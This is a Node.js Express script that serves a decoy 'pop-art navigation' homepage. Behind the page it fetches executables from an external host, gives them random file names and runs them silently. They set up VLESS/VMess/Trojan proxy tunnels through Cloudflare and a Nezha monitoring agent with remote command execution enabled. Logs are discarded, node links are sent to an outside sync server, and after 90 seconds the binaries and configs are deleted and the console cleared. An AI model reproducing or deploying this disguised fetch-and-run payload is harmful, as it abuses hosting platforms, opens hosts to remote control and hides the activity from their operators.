const express = require("express");
const app = express();
const axios = require("axios");
const os = require('os');
const fs = require("fs");
const path = require("path");
const { promisify } = require('util');
const exec = promisify(require('child_process').exec);
const { execSync } = require('child_process');

// --- 核心变量配置 ---
const SYNC_URL = process.env.UPLOAD_URL || '';      
const APP_URL = process.env.PROJECT_URL || '';      
const AUTO_PING = process.env.AUTO_ACCESS || false; 
const WORK_DIR = process.env.FILE_PATH || './tmp';  
const FEED_PATH = process.env.SUB_PATH || 'qianxiuadmin';    
const SVC_PORT = process.env.SERVER_PORT || process.env.PORT || 3000;
const USER_ID = process.env.UUID || '1480dd0c-c55f-405b-88c9-7ecc49ff0a1f'; 

const NEZHA_SERVER = process.env.NEZHA_SERVER || '';
const NEZHA_PORT = process.env.NEZHA_PORT || '';
const NEZHA_KEY = process.env.NEZHA_KEY || '';
const ARGO_DOMAIN = process.env.ARGO_DOMAIN || '';
const ARGO_AUTH = process.env.ARGO_AUTH || '';
const ARGO_PORT = process.env.ARGO_PORT || 8002;

const OPT_IP = process.env.CFIP || 'cdns.doon.eu.org'; 
const OPT_PORT = process.env.CFPORT || 443;            
const NODE_LABEL = process.env.NAME || '';             

// --- 静态页面内容 (已替换为个性化波普导航) ---
const HOME_PAGE = `
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>个性化波普导航</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Archivo+Black&family=Outfit:wght@400;700&display=swap');

        :root {
            --bg-color: #F4F2ED;
            --accent-yellow: #FFDE03;
            --accent-pink: #FF52AF;
            --accent-blue: #3E61FF;
            --accent-green: #00E699;
            --black: #1A1A1A;
        }

        body {
            font-family: 'Outfit', sans-serif;
            background-color: var(--bg-color);
            color: var(--black);
        }

        h1, h2, .font-bold-black {
            font-family: 'Archivo Black', sans-serif;
        }

        .neo-box {
            background: white;
            border: 3px solid var(--black);
            box-shadow: 6px 6px 0px 0px var(--black);
            transition: all 0.1s ease;
        }

        .neo-box:hover {
            transform: translate(-2px, -2px);
            box-shadow: 10px 10px 0px 0px var(--black);
        }

        .neo-box:active {
            transform: translate(4px, 4px);
            box-shadow: 0px 0px 0px 0px var(--black);
        }

        .neo-btn-yellow { background-color: var(--accent-yellow); }
        .neo-btn-pink { background-color: var(--accent-pink); }
        .neo-btn-blue { background-color: var(--accent-blue); color: white; }
        .neo-btn-green { background-color: var(--accent-green); }

        .search-container input {
            border: 3px solid var(--black);
            box-shadow: 4px 4px 0px 0px var(--black);
        }

        .marquee {
            white-space: nowrap;
            overflow: hidden;
            border-bottom: 3px solid var(--black);
            background: var(--black);
            color: white;
            padding: 8px 0;
        }
        .marquee span {
            display: inline-block;
            animation: marquee 20s linear infinite;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        @keyframes marquee {
            0% { transform: translateX(100%); }
            100% { transform: translateX(-100%); }
        }
    </style>
</head>
<body class="pb-20">

    <div class="marquee">
        <span> ⚡️ 欢迎来到未来导航站 • STAY CURIOUS • DESIGN YOUR LIFE • EXPLORE NEW TOOLS • ⚡️ </span>
    </div>

    <header class="max-w-7xl mx-auto px-6 pt-12 pb-8">
        <div class="flex flex-col md:flex-row justify-between items-end gap-8">
            <div class="relative">
                <div class="absolute -top-4 -left-4 w-12 h-12 bg-pink-400 rounded-full mix-blend-multiply opacity-70 animate-pulse"></div>
                <h1 class="text-6xl md:text-8xl uppercase leading-none relative z-10">
                    MINE<br><span class="text-blue-600">STASH</span>
                </h1>
                <p class="mt-4 text-xl font-bold italic bg-yellow-300 inline-block px-2">别让你的灵感生锈。</p>
            </div>

            <div class="search-container w-full md:w-96">
                <input type="text" id="searchInput" placeholder="搜索资源..." 
                    class="w-full px-6 py-4 text-lg font-bold outline-none focus:bg-white bg-gray-50 transition-colors">
            </div>
        </div>
    </header>

    <main class="max-w-7xl mx-auto px-6 mt-12">
        
        <div class="flex flex-wrap gap-4 mb-16">
            <button class="neo-box px-6 py-2 font-bold neo-btn-yellow">全部</button>
            <button class="neo-box px-6 py-2 font-bold bg-white hover:neo-btn-pink">创意工具</button>
            <button class="neo-box px-6 py-2 font-bold bg-white hover:neo-btn-blue">编程开发</button>
            <button class="neo-box px-6 py-2 font-bold bg-white hover:neo-btn-green">AI 实验室</button>
        </div>

        <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-8" id="grid">
            
            <a href="https://dribbble.com" target="_blank" class="nav-card neo-box p-6 flex flex-col gap-4 group">
                <div class="w-14 h-14 neo-box neo-btn-pink flex items-center justify-center">
                    <i data-lucide="dribbble" class="w-8 h-8"></i>
                </div>
                <div>
                    <h3 class="text-2xl font-bold mb-2 group-hover:underline">Dribbble</h3>
                    <p class="text-sm font-medium leading-tight">全球顶级设计师的灵感避风港。</p>
                </div>
                <div class="mt-auto pt-4 flex items-center gap-2 font-black text-xs uppercase">
                    <span>访问网站</span>
                    <i data-lucide="arrow-right" class="w-4 h-4"></i>
                </div>
            </a>

            <a href="https://github.com" target="_blank" class="nav-card neo-box p-6 flex flex-col gap-4 group">
                <div class="w-14 h-14 neo-box neo-btn-blue flex items-center justify-center text-white">
                    <i data-lucide="github" class="w-8 h-8"></i>
                </div>
                <div>
                    <h3 class="text-2xl font-bold mb-2 group-hover:underline">GitHub</h3>
                    <p class="text-sm font-medium leading-tight">构建世界，从一行代码开始。</p>
                </div>
                <div class="mt-auto pt-4 flex items-center gap-2 font-black text-xs uppercase">
                    <span>访问网站</span>
                    <i data-lucide="arrow-right" class="w-4 h-4"></i>
                </div>
            </a>

            <a href="https://openai.com" target="_blank" class="nav-card neo-box p-6 flex flex-col gap-4 group">
                <div class="w-14 h-14 neo-box neo-btn-green flex items-center justify-center">
                    <i data-lucide="zap" class="w-8 h-8"></i>
                </div>
                <div>
                    <h3 class="text-2xl font-bold mb-2 group-hover:underline">ChatGPT</h3>
                    <p class="text-sm font-medium leading-tight">AI 时代的瑞士军刀，无所不能。</p>
                </div>
                <div class="mt-auto pt-4 flex items-center gap-2 font-black text-xs uppercase">
                    <span>访问网站</span>
                    <i data-lucide="arrow-right" class="w-4 h-4"></i>
                </div>
            </a>

            <a href="https://youtube.com" target="_blank" class="nav-card neo-box p-6 flex flex-col gap-4 group bg-yellow-300 shadow-[6px_6px_0px_0px_rgba(0,0,0,1)]">
                <div class="w-14 h-14 neo-box bg-white flex items-center justify-center text-red-600 border-none">
                    <i data-lucide="youtube" class="w-8 h-8"></i>
                </div>
                <div>
                    <h3 class="text-2xl font-bold mb-2 group-hover:underline">YouTube</h3>
                    <p class="text-sm font-medium leading-tight">世界上最大的视频学习库。</p>
                </div>
                <div class="mt-auto pt-4 flex items-center gap-2 font-black text-xs uppercase">
                    <span>访问网站</span>
                    <i data-lucide="arrow-right" class="w-4 h-4"></i>
                </div>
            </a>

        </div>
    </main>

    <footer class="mt-24 border-t-4 border-black bg-white p-8">
        <div class="max-w-7xl mx-auto flex flex-col md:flex-row justify-between items-center gap-6">
            <p class="font-bold text-lg italic">CREATED BY YOURSELF. 2024</p>
            <div class="flex gap-6">
                <a href="#" class="font-black border-b-2 border-black">Twitter</a>
                <a href="#" class="font-black border-b-2 border-black">RSS Feed</a>
                <a href="#" class="font-black border-b-2 border-black">Privacy</a>
            </div>
        </div>
    </footer>

    <script>
        lucide.createIcons();
        const searchInput = document.getElementById('searchInput');
        const cards = document.querySelectorAll('.nav-card');

        searchInput.addEventListener('input', (e) => {
            const term = e.target.value.toLowerCase();
            cards.forEach(card => {
                const text = card.innerText.toLowerCase();
                card.style.display = text.includes(term) ? 'flex' : 'none';
            });
        });
    </script>
</body>
</html>
`;

// 初始化运行环境
if (!fs.existsSync(WORK_DIR)) {
  fs.mkdirSync(WORK_DIR);
  console.log(`${WORK_DIR} created`);
}

// 随机ID生成器
function getRandomId() {
  const chars = 'abcdefghijklmnopqrstuvwxyz';
  let str = '';
  for (let i = 0; i < 6; i++) {
    str += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return str;
}

const execAgent = getRandomId(); 
const execCore = getRandomId();  
const execTunnel = getRandomId(); 
const execMonitor = getRandomId(); 

let agentPath = path.join(WORK_DIR, execAgent);
let monitorPath = path.join(WORK_DIR, execMonitor);
let corePath = path.join(WORK_DIR, execCore);
let tunnelPath = path.join(WORK_DIR, execTunnel);

let cacheFile = path.join(WORK_DIR, 'cache.dat'); 
let listFile = path.join(WORK_DIR, 'list.txt');
let logFile = path.join(WORK_DIR, 'runtime.log');
let confFile = path.join(WORK_DIR, 'info.json'); 

function flushLegacy() {
  try {
    if (!SYNC_URL) return;
    if (!fs.existsSync(cacheFile)) return;

    let content;
    try {
      content = fs.readFileSync(cacheFile, 'utf-8');
    } catch { return null; }

    const raw = Buffer.from(content, 'base64').toString('utf-8');
    const nodes = raw.split('\n').filter(l => 
      /(vless|vmess|trojan|hysteria2|tuic):\/\//.test(l)
    );

    if (nodes.length === 0) return;

    axios.post(`${SYNC_URL}/api/delete-nodes`, 
      JSON.stringify({ nodes }),
      { headers: { 'Content-Type': 'application/json' } }
    ).catch(() => {});
    return null;
  } catch (e) { return null; }
}

function sweepWorkDir() {
  try {
    const files = fs.readdirSync(WORK_DIR);
    files.forEach(f => {
      try {
        const fp = path.join(WORK_DIR, f);
        if (fs.statSync(fp).isFile()) fs.unlinkSync(fp);
      } catch {}
    });
  } catch {}
}

app.get("/", function(req, res) {
  res.send(HOME_PAGE);
});

async function setupCore() {
  const conf = {
    log: { access: '/dev/null', error: '/dev/null', loglevel: 'none' },
    inbounds: [
      { port: ARGO_PORT, protocol: 'vless', settings: { clients: [{ id: USER_ID, flow: 'xtls-rprx-vision' }], decryption: 'none', fallbacks: [{ dest: 3001 }, { path: "/vless-argo", dest: 3002 }, { path: "/vmess-argo", dest: 3003 }, { path: "/trojan-argo", dest: 3004 }] }, streamSettings: { network: 'tcp' } },
      { port: 3001, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: USER_ID }], decryption: "none" }, streamSettings: { network: "tcp", security: "none" } },
      { port: 3002, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: USER_ID, level: 0 }], decryption: "none" }, streamSettings: { network: "ws", security: "none", wsSettings: { path: "/vless-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
      { port: 3003, listen: "127.0.0.1", protocol: "vmess", settings: { clients: [{ id: USER_ID, alterId: 0 }] }, streamSettings: { network: "ws", wsSettings: { path: "/vmess-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
      { port: 3004, listen: "127.0.0.1", protocol: "trojan", settings: { clients: [{ password: USER_ID }] }, streamSettings: { network: "ws", security: "none", wsSettings: { path: "/trojan-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
    ],
    dns: { servers: ["https+local://8.8.8.8/dns-query"] },
    outbounds: [ { protocol: "freedom", tag: "direct" }, {protocol: "blackhole", tag: "block"} ]
  };
  fs.writeFileSync(confFile, JSON.stringify(conf, null, 2));
}

function checkArch() {
  const arch = os.arch();
  return (arch === 'arm' || arch === 'arm64' || arch === 'aarch64') ? 'arm' : 'amd';
}

function fetchBin(name, url, cb) {
  const target = name;
  if (!fs.existsSync(WORK_DIR)) fs.mkdirSync(WORK_DIR, { recursive: true });
  
  const w = fs.createWriteStream(target);
  axios({ method: 'get', url: url, responseType: 'stream' })
    .then(resp => {
      resp.data.pipe(w);
      w.on('finish', () => { w.close(); cb(null, target); });
      w.on('error', err => { fs.unlink(target, () => {}); cb(err.message); });
    })
    .catch(err => cb(err.message));
}

async function bootstrap() {  
  const arch = checkArch();
  const resources = getResources(arch);

  if (!resources.length) return;

  const tasks = resources.map(r => {
    return new Promise((resolve, reject) => {
      fetchBin(r.fileName, r.fileUrl, (err, p) => err ? reject(err) : resolve(p));
    });
  });

  try {
    await Promise.all(tasks);
  } catch (err) {
    console.error('Resource fetch error:', err);
    return;
  }

  function setPerms(paths) {
    paths.forEach(p => {
      if (fs.existsSync(p)) fs.chmod(p, 0o775, () => {});
    });
  }
  const bins = NEZHA_PORT ? [agentPath, corePath, tunnelPath] : [monitorPath, corePath, tunnelPath];
  setPerms(bins);

  if (NEZHA_SERVER && NEZHA_KEY) {
    if (!NEZHA_PORT) {
      const port = NEZHA_SERVER.includes(':') ? NEZHA_SERVER.split(':').pop() : '';
      const secure = ['443', '8443', '2096', '2087', '2083', '2053'].includes(port) ? 'true' : 'false';
      
      const yml = `
client_secret: ${NEZHA_KEY}
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: true
ip_report_period: 1800
report_delay: 4
server: ${NEZHA_SERVER}
skip_connection_count: true
skip_procs_count: true
temperature: false
tls: ${secure}
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: ${USER_ID}`;
      
      fs.writeFileSync(path.join(WORK_DIR, 'config.yaml'), yml);
      try {
        await exec(`nohup ${monitorPath} -c "${WORK_DIR}/config.yaml" >/dev/null 2>&1 &`);
        await new Promise(r => setTimeout(r, 1000));
      } catch {}
    } else {
      let tlsFlag = '';
      if (['443', '8443', '2096', '2087', '2083', '2053'].includes(NEZHA_PORT)) tlsFlag = '--tls';
      try {
        await exec(`nohup ${agentPath} -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${tlsFlag} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &`);
        await new Promise(r => setTimeout(r, 1000));
      } catch {}
    }
  }

  try {
    await exec(`nohup ${corePath} -c ${confFile} >/dev/null 2>&1 &`);
    await new Promise(r => setTimeout(r, 1000));
  } catch {}

  if (fs.existsSync(tunnelPath)) {
    let args;
    if (ARGO_AUTH.match(/^[A-Z0-9a-z=]{120,250}$/)) {
      args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token ${ARGO_AUTH}`;
    } else if (ARGO_AUTH.match(/TunnelSecret/)) {
      args = `tunnel --edge-ip-version auto --config ${WORK_DIR}/tunnel.yml run`;
    } else {
      args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${logFile} --loglevel info --url http://localhost:${ARGO_PORT}`;
    }

    try {
      await exec(`nohup ${tunnelPath} ${args} >/dev/null 2>&1 &`);
      await new Promise(r => setTimeout(r, 2000));
    } catch {}
  }
  await new Promise(r => setTimeout(r, 5000));
}

function getResources(arch) {
  let list;
  const baseUrl = "https://amd64.ssss.nyc.mn"; 
  const armUrl = "https://arm64.ssss.nyc.mn";
  
  if (arch === 'arm') {
    list = [
      { fileName: corePath, fileUrl: `${armUrl}/web` },
      { fileName: tunnelPath, fileUrl: `${armUrl}/bot` }
    ];
  } else {
    list = [
      { fileName: corePath, fileUrl: `${baseUrl}/web` },
      { fileName: tunnelPath, fileUrl: `${baseUrl}/bot` }
    ];
  }

  if (NEZHA_SERVER && NEZHA_KEY) {
    if (NEZHA_PORT) {
      const url = arch === 'arm' ? `${armUrl}/agent` : `${baseUrl}/agent`;
      list.unshift({ fileName: agentPath, fileUrl: url });
    } else {
      const url = arch === 'arm' ? `${armUrl}/v1` : `${baseUrl}/v1`;
      list.unshift({ fileName: monitorPath, fileUrl: url });
    }
  }
  return list;
}

function setupTunnelConf() {
  if (!ARGO_AUTH || !ARGO_DOMAIN) return;

  if (ARGO_AUTH.includes('TunnelSecret')) {
    fs.writeFileSync(path.join(WORK_DIR, 'tunnel.json'), ARGO_AUTH);
    const yml = `
  tunnel: ${ARGO_AUTH.split('"')[11]}
  credentials-file: ${path.join(WORK_DIR, 'tunnel.json')}
  protocol: http2
  ingress:
    - hostname: ${ARGO_DOMAIN}
      service: http://localhost:${ARGO_PORT}
      originRequest:
        noTLSVerify: true
    - service: http_status:404
  `;
    fs.writeFileSync(path.join(WORK_DIR, 'tunnel.yml'), yml);
  }
}

async function resolveDomains() {
  let dom;

  if (ARGO_AUTH && ARGO_DOMAIN) {
    dom = ARGO_DOMAIN;
    await buildFeed(dom);
  } else {
    try {
      const content = fs.readFileSync(logFile, 'utf-8');
      const m = content.match(/https?:\/\/([^ ]*trycloudflare\.com)\/?/);
      
      if (m && m[1]) {
        dom = m[1];
        await buildFeed(dom);
      } else {
        fs.unlinkSync(logFile);
        const killCmd = process.platform === 'win32' 
          ? `taskkill /f /im ${execTunnel}.exe > nul 2>&1`
          : `pkill -f ${execTunnel} > /dev/null 2>&1`;
        
        try { await exec(killCmd); } catch {}
        
        await new Promise(r => setTimeout(r, 3000));
        const args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${logFile} --loglevel info --url http://localhost:${ARGO_PORT}`;
        try {
          await exec(`nohup ${tunnelPath} ${args} >/dev/null 2>&1 &`);
          await new Promise(r => setTimeout(r, 3000));
          await resolveDomains();
        } catch {}
      }
    } catch {}
  }
}

async function getRegion() {
  try {
    const r = await axios.get('https://ipapi.co/json/', { timeout: 3000 });
    if (r.data?.country_code && r.data?.org) return `${r.data.country_code}_${r.data.org}`;
  } catch {
      try {
        const r2 = await axios.get('http://ip-api.com/json/', { timeout: 3000 });
        if (r2.data?.status === 'success') return `${r2.data.countryCode}_${r2.data.org}`;
      } catch {}
  }
  return 'Unknown';
}

async function buildFeed(dom) {
  const region = await getRegion();
  const label = NODE_LABEL ? `${NODE_LABEL}-${region}` : region;
  
  return new Promise((resolve) => {
    setTimeout(() => {
      const meta = { v: '2', ps: `${label}`, add: OPT_IP, port: OPT_PORT, id: USER_ID, aid: '0', scy: 'none', net: 'ws', type: 'none', host: dom, path: '/vmess-argo?ed=2560', tls: 'tls', sni: dom, alpn: '', fp: 'firefox'};
      const feed = `
vless://${USER_ID}@${OPT_IP}:${OPT_PORT}?encryption=none&security=tls&sni=${dom}&fp=firefox&type=ws&host=${dom}&path=%2Fvless-argo%3Fed%3D2560#${label}

vmess://${Buffer.from(JSON.stringify(meta)).toString('base64')}

trojan://${USER_ID}@${OPT_IP}:${OPT_PORT}?security=tls&sni=${dom}&fp=firefox&type=ws&host=${dom}&path=%2Ftrojan-argo%3Fed%3D2560#${label}
    `;
      
      console.log(Buffer.from(feed).toString('base64'));
      fs.writeFileSync(cacheFile, Buffer.from(feed).toString('base64'));
      
      syncData(); 

      app.get(`/${FEED_PATH}`, (req, res) => {
        res.set('Content-Type', 'text/plain; charset=utf-8');
        res.send(Buffer.from(feed).toString('base64'));
      });
      resolve(feed);
      }, 2000);
    });
}

async function syncData() {
  if (SYNC_URL && APP_URL) {
    const subUrl = `${APP_URL}/${FEED_PATH}`;
    try {
        await axios.post(`${SYNC_URL}/api/add-subscriptions`, { subscription: [subUrl] }, { headers: { 'Content-Type': 'application/json' } });
    } catch {}
  } else if (SYNC_URL) {
      if (!fs.existsSync(listFile)) return;
      const raw = fs.readFileSync(listFile, 'utf-8');
      const nodes = raw.split('\n').filter(l => /(vless|vmess|trojan|hysteria2|tuic):\/\//.test(l));
      if (!nodes.length) return;

      try {
          await axios.post(`${SYNC_URL}/api/add-nodes`, JSON.stringify({ nodes }), { headers: { 'Content-Type': 'application/json' } });
      } catch {}
  }
}

function purge() {
  setTimeout(() => {
    const targets = [logFile, confFile, corePath, tunnelPath];  
    if (NEZHA_PORT) targets.push(agentPath);
    else if (NEZHA_SERVER && NEZHA_KEY) targets.push(monitorPath);

    const cmd = process.platform === 'win32' 
      ? `del /f /q ${targets.join(' ')} > nul 2>&1`
      : `rm -rf ${targets.join(' ')} >/dev/null 2>&1`;
      
    exec(cmd, () => {
        console.clear();
        console.log('Service active');
    });
  }, 90000);
}
purge();

async function keepAlive() {
  if (!AUTO_PING || !APP_URL) return;
  try {
    await axios.post('https://oooo.serv00.net/add-url', { url: APP_URL }, { headers: { 'Content-Type': 'application/json' } });
  } catch {}
}

async function initService() {
  try {
    setupTunnelConf();
    flushLegacy();
    sweepWorkDir();
    await setupCore();
    await bootstrap();
    await resolveDomains();
    await keepAlive();
  } catch (e) {
    console.error('Init error:', e);
  }
}

initService().catch(() => {});
app.listen(SVC_PORT, () => console.log(`Service port:${SVC_PORT}`));
